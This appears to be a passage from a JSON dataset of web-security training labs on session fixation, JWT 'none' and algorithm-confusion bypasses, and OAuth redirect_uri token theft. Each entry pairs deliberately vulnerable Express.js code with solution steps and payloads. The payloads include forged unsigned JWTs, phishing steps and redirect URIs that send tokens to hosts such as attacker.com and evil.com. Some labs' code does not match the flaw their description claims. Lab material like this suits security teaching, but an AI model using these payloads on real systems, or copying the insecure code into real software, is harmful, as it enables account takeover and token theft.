      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'oldpass' }]; app.get('/session', (req, res) => { const sid = req.query.sid || Math.random().toString(36).substring(7); sessions[sid] = null; res.cookie('sid', sid); res.send('Session created'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); sessions[sid] = username; res.send('Logged in'); }); app.post('/change-password', (req, res) => { const sid = req.cookies.sid; const user = sessions[sid]; if (user) { users.find(u => u.username === user).password = req.body.newPassword; res.send('Password changed'); } else res.status(403).send('Not logged in'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid] === 'carlos') res.send('Welcome carlos'); else res.send('Access denied'); }); app.listen(4002, () => console.log('Session Fixation Lab running...'));",
      "payloads": [
        "GET /session?sid=attackerfixed123",
        "Cookie: sid=attackerfixed123",
        "POST /login with sid=attackerfixed123",
        "POST /change-password with sid=attackerfixed123"
      ]
    },
    {
      "Lab scenario": "JWT None Algorithm Bypass in Authorization Header",
      "Lab Description": "This lab demonstrates a misconfigured JWT validation mechanism where the application fails to verify token signatures if the algorithm is set to 'none'. The application trusts JWTs from the Authorization header for user session validation. To solve: Forge a JWT for the admin user by modifying the algorithm to 'none' and access the admin dashboard.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Postman to send a valid login request and capture the returned JWT from the Authorization header.",
        "2. Decode the JWT using jwt.io and observe that the algorithm is 'HS256'.",
        "3. Modify the JWT header to set \"alg\":\"none\" and change the payload's \"username\" to \"admin\".",
        "4. Remove the signature portion of the JWT and reconstruct the token using only header.payload.",
        "5. Use Burp Repeater to send a GET request to /admin-dashboard with the forged JWT in the Authorization header.",
        "6. If successful, the admin dashboard will load, confirming that the lab is solved."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 's3cret'; app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(403).send('No token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret); if (decoded.username === 'admin') return res.send('Welcome admin!'); else return res.status(403).send('Access denied'); } catch (err) { return res.status(403).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on http://localhost:4000'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
      ]
    },
    {
      "Lab scenario": "Session Fixation via Unvalidated Session ID in URL",
      "Lab Description": "This lab illustrates session fixation where the server accepts any arbitrary session ID supplied via a URL query parameter without validation or regeneration on login. The application does not issue a new session ID after successful authentication. To solve: Fix the victim's session ID before login, then log in with their credentials and access the profile page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Burp Suite to intercept a GET /login?sessionId=attacker-session request and send it to Repeater.",
        "2. Visit the /register endpoint and create a dummy account using the attacker-session value as the session cookie.",
        "3. Log out and convince the victim (Carlos) to click a crafted link: /login?sessionId=attacker-session.",
        "4. Use Burp to replay the login request for Carlos with the sessionId attacker-session and his credentials.",
        "5. Access /my-account while using the same session ID to confirm access to Carlos's profile page.",
        "6. The lab is solved when you view Carlos's account details with a fixed session ID."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = [{ username: 'carlos', password: 'carlospw' }]; app.get('/login', (req, res) => { const sessionId = req.query.sessionId; sessions[sessionId] = null; res.send(`<form method='POST' action='/authenticate?sessionId=${sessionId}'><input name='username'><input name='password'><button>Login</button></form>`); }); app.post('/authenticate', (req, res) => { const sessionId = req.query.sessionId; let body = ''; req.on('data', chunk => { body += chunk; }); req.on('end', () => { const params = new URLSearchParams(body); const user = users.find(u => u.username === params.get('username') && u.password === params.get('password')); if (user) { sessions[sessionId] = user.username; res.redirect(`/my-account?sessionId=${sessionId}`); } else { res.status(403).send('Login failed'); } }); }); app.get('/my-account', (req, res) => { const sessionId = req.query.sessionId; const user = sessions[sessionId]; if (user) res.send(`Welcome ${user}, this is your account`); else res.status(403).send('Not logged in'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
      "payloads": [
        "/login?sessionId=attacker-session",
        "/authenticate?sessionId=attacker-session",
        "/my-account?sessionId=attacker-session"
      ]
    },
    {
      "Lab scenario": "OAuth Misconfiguration in Redirect URI Validation",
      "Lab Description": "This lab showcases an OAuth implementation vulnerable to an open redirect flaw in its redirect_uri parameter. The authorization server fails to strictly validate redirect URIs, allowing attackers to hijack authorization codes. To solve: Trick the victim into authorizing your application, intercept the OAuth code via a malicious redirect URI, and exchange it for an access token.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use OWASP ZAP to scan the /authorize?redirect_uri parameter for weak validation patterns.",
        "2. Discover that the app accepts subdomains of example.com and permits wildcard matching.",
        "3. Create a payload with redirect_uri=https://attacker.example.com/callback and register a listener.",
        "4. Trick the victim into clicking a crafted URL to initiate OAuth flow: /authorize?client_id=trusted-client&redirect_uri=https://attacker.example.com/callback&response_type=code.",
        "5. Capture the authorization code on your listener, then POST it to /oauth/token to retrieve the access token.",
        "6. Use the access token to access /profile with Authorization: Bearer <token> and retrieve Carlos’s data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const validClients = ['trusted-client']; app.get('/authorize', (req, res) => { const { client_id, redirect_uri } = req.query; if (!validClients.includes(client_id)) return res.status(403).send('Invalid client'); if (redirect_uri.includes('.example.com')) { const authCode = 'authcode-carlos'; res.redirect(`${redirect_uri}?code=${authCode}`); } else { res.status(400).send('Invalid redirect'); } }); app.post('/oauth/token', (req, res) => { let body = ''; req.on('data', chunk => { body += chunk; }); req.on('end', () => { const params = new URLSearchParams(body); if (params.get('code') === 'authcode-carlos') res.json({ access_token: 'token-carlos' }); else res.status(403).send('Invalid code'); }); }); app.get('/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'token-carlos') res.send('Welcome back, Carlos. Here is your profile.'); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on http://localhost:4000'));",
      "payloads": [
        "/authorize?client_id=trusted-client&redirect_uri=https://attacker.example.com/callback&response_type=code",
        "POST /oauth/token with code=authcode-carlos",
        "Authorization: Bearer token-carlos"
      ]
    },
    {
      "Lab scenario": "JWT tampering via 'none' algorithm in Authorization header",
      "Lab Description": "This lab implements stateless authentication using JWTs passed in the Authorization header. The backend fails to validate the algorithm used in the JWT header. The application trusts any token as long as the signature structure is present. To solve: Forge a JWT that grants access to Carlos’s account using the 'none' algorithm.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Capture the Authorization header during login using Burp Suite.",
        "Send the token to jwt.io or manually decode it to inspect its header and payload.",
        "Modify the JWT header by changing 'alg' to 'none' and removing the signature.",
        "Manually update the payload to impersonate the user 'carlos'.",
        "Use Postman to craft a new request with the forged Authorization header and access /my-account endpoint."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', role: 'admin' }]; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, 'secret'); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (!decoded) return res.status(401).send('Unauthorized'); res.send(`Welcome ${decoded.payload.username}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass running on http://localhost:${PORT}`));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
      ]
    },
    {
      "Lab scenario": "Open redirect abuse in OAuth flow for token theft",
      "Lab Description": "The lab uses OAuth to authenticate users via a third-party provider. The 'redirect_uri' parameter is not properly validated, allowing attackers to intercept the access token after successful login. To solve: Capture the access token issued to Carlos by abusing the redirect_uri.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Initiate the OAuth login and intercept the authorization request using Burp Suite.",
        "Modify the 'redirect_uri' parameter to point to your attacker-controlled server (e.g. https://attacker.com/callback).",
        "Start a listener on the attacker-controlled server to capture redirected URLs.",
        "Share the malicious OAuth link with Carlos and wait for him to authenticate.",
        "Extract the access_token from the captured URL fragment and use it with Postman to call /my-account with Authorization: Bearer <token>."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const axios = require('axios'); const qs = require('querystring'); const app = express(); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'token123_for_carlos'; res.redirect(`${redirectUri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token123_for_carlos') res.send('Welcome carlos'); else res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "https://vuln-site.com/auth?redirect_uri=https://attacker.com/callback",
        "https://attacker.com/callback#access_token=token123_for_carlos",
        "Authorization: Bearer token123_for_carlos"
      ]
    },
    {
      "Lab scenario": "Session fixation using static token in cookie",
      "Lab Description": "The app issues session cookies with predictable static values tied to usernames, and fails to regenerate sessions on login. Attackers can set a valid cookie before login, leading to session fixation. To solve: Fix Carlos’s session, then use the token to access his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to inspect the Set-Cookie value on your own login and note its static structure (e.g., session=<username>_token).",
        "Manually craft a session cookie as 'session=carlos_token' and inject it using Burp or Postman.",
        "Share a crafted login URL with Carlos that preserves the malicious session.",
        "Wait for Carlos to authenticate using your crafted session.",
        "Revisit /my-account with the same cookie to confirm session fixation and access Carlos’s account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = ['alice', 'carlos']; app.get('/login', (req, res) => { const { username } = req.query; if (users.includes(username)) { res.cookie('session', `${username}_token`); res.send('Logged in'); } else res.status(401).send('Invalid'); }); app.get('/my-account', (req, res) => { const token = req.cookies.session; if (token === 'carlos_token') res.send('Welcome carlos'); else res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "Cookie: session=carlos_token",
        "https://vuln-app.com/login?username=carlos",
        "Set-Cookie: session=carlos_token"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion in REST API authentication",
      "Lab Description": "The backend uses JSON Web Tokens (JWT) for stateless authentication and incorrectly accepts tokens signed with 'none' algorithm. The application fails to validate the token signature properly, allowing attackers to forge tokens. To solve: Forge an admin JWT and access the /admin/dashboard endpoint.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite or Postman to log in as a regular user and capture the JWT from the Authorization header.",
        "Use jwt.io to decode the token and observe it uses HS256 algorithm.",
        "Craft a new JWT with the same payload but change the 'alg' to 'none' and remove the signature.",
        "Replace the original JWT in Burp with the modified unsigned token and set 'role' to 'admin'.",
        "Send a request to GET /admin/dashboard and confirm admin access is granted."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin/dashboard', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const payload = jwt.decode(token, { complete: true }); if (payload && payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.role === 'admin') return res.send('Admin access granted'); } const verified = jwt.verify(token, SECRET); if (verified.role === 'admin') return res.send('Admin access granted'); } catch (e) { return res.status(403).send('Invalid token'); } res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('JWT Confusion Lab running'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
        "{alg: 'none', payload: { username: 'carlos', role: 'admin' }}",
        "Authorization: Bearer <forged-jwt>"
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session IDs",
      "Lab Description": "The application assigns session tokens before authentication and fails to regenerate them post-login. This allows attackers to fix a session ID for the victim and hijack the session. To solve: Fix a session for Carlos, let him authenticate, then access his account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use OWASP ZAP or Burp Suite to initiate a session and capture your session ID from the Set-Cookie header.",
        "Share the fixed session ID link with the victim, e.g., /login?sessionid=abc123.",
        "Assume the victim logs in via the crafted link and binds the session to their authenticated context.",
        "Send a GET /my-account request with the fixed session ID in Cookie header.",
        "Access Carlos’s account details to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein' }]; const sessions = {}; app.get('/login', (req, res) => { let sessionId = req.query.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sessionId); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.send('Login failed'); const sid = req.cookies.sessionid; sessions[sid] = { username }; res.send('Logged in'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid]) return res.send(`Account: ${sessions[sid].username}`); res.send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
      "payloads": [
        "GET /login?sessionid=fixed123",
        "Cookie: sessionid=fixed123",
        "POST /login with body: username=carlos&password=letmein",
        "GET /my-account with Cookie: sessionid=fixed123"
      ]
    },
    {
      "Lab scenario": "OAuth redirect URI manipulation",
      "Lab Description": "The OAuth flow accepts a wide range of redirect URIs without strict validation. This allows an attacker to inject malicious domains to capture authorization codes. To solve: Exploit the open redirect to capture Carlos’s OAuth token and log in as him.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Initiate OAuth login and intercept the request to the /auth endpoint using Burp.",
        "Modify the redirect_uri parameter to point to your malicious server (e.g., https://evil.com/callback).",
        "Host a listener on https://evil.com/callback to capture the code from query string.",
        "Exchange the stolen code for a token using the /oauth/token endpoint.",
        "Use the token to access /my-account as Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const authorizedRedirects = []; app.get('/auth', (req, res) => { const { redirect_uri } = req.query;  res.redirect(`${redirect_uri}?code=auth123`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'auth123') return res.json({ access_token: 'token-for-carlos' }); res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer token-for-carlos') return res.send('Carlos account details'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Redirect Lab running'));",
      "payloads": [
        "GET /auth?redirect_uri=https://evil.com/callback",
        "https://evil.com/callback?code=auth123",
        "POST /oauth/token with body: code=auth123",
        "Authorization: Bearer token-for-carlos"
      ]
    },
    {
      "Lab scenario": "JWT tampering via 'none' algorithm",
      "Lab Description": "This lab implements JWT-based session management using insecure algorithm validation. The application accepts JWTs from authenticated users, but fails to enforce proper signature validation. To solve: Tamper with the JWT to impersonate Carlos and access his account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept a request after logging in with a low-privilege account and copy the JWT from the Authorization header.",
        "Send the request to Repeater and decode the JWT using jwt.io or a Burp extension.",
        "Change the 'alg' value in the JWT header to 'none' and modify the payload to set \"username\": \"carlos\".",
        "Remove the JWT signature (everything after the second period) and re-encode the JWT.",
        "Replace the original JWT in the Authorization header with your tampered token and resend the request to access Carlos’s account page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(require('body-parser').json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') { const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); return res.json({ token }); } res.status(403).send('Invalid login'); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token); if (payload.username === 'carlos') return res.send('Welcome Carlos!'); res.send('Not Carlos'); }); app.listen(4000);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9",
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session ID",
      "Lab Description": "This lab's session management is flawed due to predictable session tokens assigned before login. The application issues a session cookie before authentication and fails to regenerate it after successful login. To solve: Fixate a known session on Carlos and reuse it post-login to access his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP to intercept your session when you visit the login page without logging in.",
        "Share your current session token (cookie) with the victim through a crafted phishing link or injection vector.",
        "Simulate the victim logging in using the same session (use curl or Postman with victim’s credentials and your session ID).",
        "After login, use your browser with the fixated session ID to access the My Account page.",
        "Confirm the identity switch and access Carlos’s account to complete the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const uuid = require('uuid'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 'hunter2' }; app.get('/login', (req, res) => { if (!req.cookies.sessionid) res.cookie('sessionid', uuid.v4()); res.send('Please log in'); }); app.post('/login', express.urlencoded({ extended: true }), (req, res) => { const { username, password } = req.body; if (users[username] === password) sessions[req.cookies.sessionid] = username; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user === 'carlos') return res.send('Welcome back, Carlos!'); res.status(403).send('Forbidden'); }); app.listen(4000);",
      "payloads": [
        "Fixated session ID via cookie injection",
        "Set-Cookie: sessionid=known-value",
        "Simulated POST /login with sessionid=known-value and carlos credentials"
      ]
    },
    {
      "Lab scenario": "OAuth implicit flow redirect URI manipulation",
      "Lab Description": "This lab uses OAuth 2.0 implicit flow, but its redirect URI validation is poorly implemented. The redirect URI can be manipulated to leak the access token to an attacker-controlled domain. To solve: Steal Carlos’s access token using an open redirect and access his profile.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp to intercept the OAuth flow when logging in and observe the redirect_uri parameter.",
        "Craft a redirect_uri pointing to an attacker-controlled domain, like https://attacker.com#access_token=",
        "Send the manipulated login link to Carlos (or simulate clicking it with Carlos’s session).",
        "Capture the leaked token on your server by checking access logs or using a webhook endpoint.",
        "Use the stolen token in a Bearer Authorization header to access /user-profile and retrieve Carlos’s data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; if (redirect_uri.includes('http')) { const token = 'carlos-token-abc123'; return res.redirect(`${redirect_uri}#access_token=${token}`); } res.status(400).send('Invalid redirect URI'); }); app.get('/user-profile', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer carlos-token-abc123') return res.send('Profile: Carlos'); res.status(401).send('Unauthorized'); }); app.listen(4000);",
      "payloads": [
        "https://vulnerable-site.com/auth?redirect_uri=https://attacker.com",
        "https://vulnerable-site.com/auth?redirect_uri=https://attacker.com/#access_token=",
        "Authorization: Bearer carlos-token-abc123"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion leading to authentication bypass",
      "Lab Description": "The authentication mechanism uses JSON Web Tokens (JWTs) for session management. However, it fails to verify the signing algorithm properly, allowing an attacker to forge tokens by switching the algorithm to 'none'. The application accepts unsigned JWTs if the alg field is tampered. To solve: forge a valid token and access Carlos's account page without valid credentials.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Burp Suite to intercept the login response and capture the JWT in the Set-Cookie header.",
        "2. Decode the JWT using jwt.io or Postman and analyze the alg field.",
        "3. Modify the alg value from HS256 to none and delete the signature part of the token.",
        "4. Change the payload sub field to 'carlos', re-encode the JWT without signing it.",
        "5. Replace the original JWT in the request cookies with the modified unsigned JWT and access /my-account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'carlos123' }]; const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ sub: username }, SECRET, { algorithm: 'HS256' }); res.cookie('auth', token); res.send('Login successful'); }); app.get('/my-account', (req, res) => { const token = req.cookies.auth; try { const decoded = jwt.verify(token, SECRET); res.send(`Account page of ${decoded.sub}`); } catch (err) { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Auth Lab running at http://localhost:${PORT}`));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
      ]
    },
    {
      "Lab scenario": "OAuth implicit flow misconfiguration",
      "Lab Description": "The lab uses OAuth 2.0's implicit flow to authorize users but fails to validate the redirect URI correctly. This enables an attacker to steal tokens by redirecting users to an attacker-controlled domain. To solve: harvest a valid access token and use it to impersonate Carlos.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Intercept the /authorize request using Burp Suite or OWASP ZAP.",
        "2. Modify the redirect_uri parameter to point to your malicious server (e.g., https://attacker.com/callback).",
        "3. Craft a phishing link containing the modified redirect_uri and trick Carlos into clicking it.",
        "4. Capture the access token from the fragment portion of the redirect URL sent to your server.",
        "5. Use the stolen token in the Authorization header (Bearer token) to access /my-account as Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const crypto = require('crypto'); const users = [{ username: 'carlos', password: 'secure123', token: 'access_token_carlos' }]; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (response_type === 'token') { const token = 'access_token_carlos'; const uri = `${redirect_uri}#access_token=${token}&token_type=bearer`; res.redirect(uri); } else { res.status(400).send('Invalid response_type'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = users.find(u => u.token === token); if (user) res.send(`Welcome ${user.username}`); else res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Flow Lab at http://localhost:${PORT}`));",
      "payloads": [
        "https://vulnerable-app.com/authorize?client_id=123&redirect_uri=https://attacker.com/callback&response_type=token",
        "https://attacker.com/callback#access_token=access_token_carlos&token_type=bearer"
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session ID",
      "Lab Description": "The application issues session cookies before authentication and does not regenerate the session ID after login. An attacker can set a known session ID for a victim, then hijack the session post-login. To solve: fixate Carlos's session and use it after he logs in.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Using Postman or Burp Suite, initiate a session by sending a GET request to /login and note the Set-Cookie header.",
        "2. Share the fixed session ID with the victim (e.g., in a phishing email or malicious link).",
        "3. Wait for the victim to log in with the fixated session ID.",
        "4. Use the same session ID to access /my-account while impersonating Carlos.",
        "5. Confirm access to his account to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'mypassword' }]; app.get('/login', (req, res) => { let sid = req.cookies.sid || 'abc123'; sessions[sid] = {}; res.cookie('sid', sid); res.send('<form method=post action=/login><input name=username><input name=password><input type=submit></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.send('Invalid login'); const sid = req.cookies.sid; sessions[sid] = { user: username }; res.send('Logged in'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid] && sessions[sid].user) res.send(`Welcome ${sessions[sid].user}`); else res.send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
      "payloads": [
        "Cookie: sid=abc123",
        "GET /login HTTP/1.1\nHost: vulnerable-app.com\nCookie: sid=abc123",
        "GET /my-account HTTP/1.1\nHost: vulnerable-app.com\nCookie: sid=abc123"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion attack in stateless API authentication",
      "Lab Description": "This lab's stateless JWT-based authentication system is vulnerable to an algorithm confusion flaw. The server uses RS256 for verifying JWTs, but it accepts tokens signed with HS256 if manipulated correctly. The application blindly trusts the 'alg' field in the JWT header. To solve: forge a valid JWT that grants access to Carlos's account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to capture a JWT issued to a valid user via login API.",
        "Decode the JWT using jwt.io or jwt-tool and analyze the header and payload for algorithm type and key fields.",
        "Change the algorithm from RS256 to HS256 and set the payload 'username' to 'carlos'.",
        "Use the public key as HMAC secret and sign the token using HS256 with jwt_tool or python-jose.",
        "Send the forged JWT via Authorization header to /my-account endpoint and verify access to Carlos's page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', role: 'user' }]; const pubKey = fs.readFileSync('./public.pem'); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, fs.readFileSync('./private.pem'), { algorithm: 'RS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, pubKey); if (decoded.username === 'carlos') res.send('Sensitive info for Carlos'); else res.send('Access denied'); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
      "payloads": [
        "HS256 JWT with payload: {\"username\":\"carlos\"}, signed using RS public key",
        "Modified header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
        "Signed using HMAC with public key as secret"
      ]
    },
    {
      "Lab scenario": "Session fixation in classic web login flow",
      "Lab Description": "The application fails to invalidate the user's session upon successful login, making it vulnerable to session fixation. The attacker can set a session identifier before the victim logs in, and the application continues using the same session after authentication. To solve: Fix a session ID, trick Carlos to log in, and then use the session ID to access his account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to initiate a session with GET /login and capture the Set-Cookie header.",
        "Send the session cookie to Carlos via social engineering or simulate login with known credentials using the fixed session ID.",
        "Ensure that the application does not issue a new session ID post-login by observing response cookies.",
        "Reuse the fixed session ID and send a request to /my-account with the session cookie set.",
        "Verify access to Carlos's account page using the same session identifier."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; const users = [{ username: 'carlos', password: 'hunter2' }]; app.get('/login', (req, res) => { const sid = Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.setHeader('Set-Cookie', 'session=' + sid); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sid] = { authenticated: true, username }; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.session]; if (session?.authenticated && session.username === 'carlos') { res.send('Carlos's account'); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
      "payloads": [
        "Fixed session ID like 'attacker123' set via Set-Cookie header",
        "Crafted POST /login request with known user credentials and fixed session cookie",
        "GET /my-account with same session ID reused after victim login"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration leaking tokens via redirect",
      "Lab Description": "The OAuth implementation of this app leaks access tokens via an open redirect vulnerability after authorization. The redirect_uri parameter is not properly validated, allowing attackers to capture tokens sent via URL fragments. To solve: Trick the authorization server into sending Carlos's token to your controlled endpoint.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Start OAuth authorization flow with Burp and intercept the GET /authorize request.",
        "Modify the redirect_uri parameter to an attacker-controlled domain or path (e.g., https://attacker.com/callback).",
        "Trick Carlos into authorizing the app by sending the crafted link.",
        "Capture the access token in the redirect fragment sent to your endpoint (e.g., #access_token=abc123).",
        "Use the stolen token in the Authorization header to access the protected /my-account endpoint."
      ],
      "Vulnerability name": "Authentication",
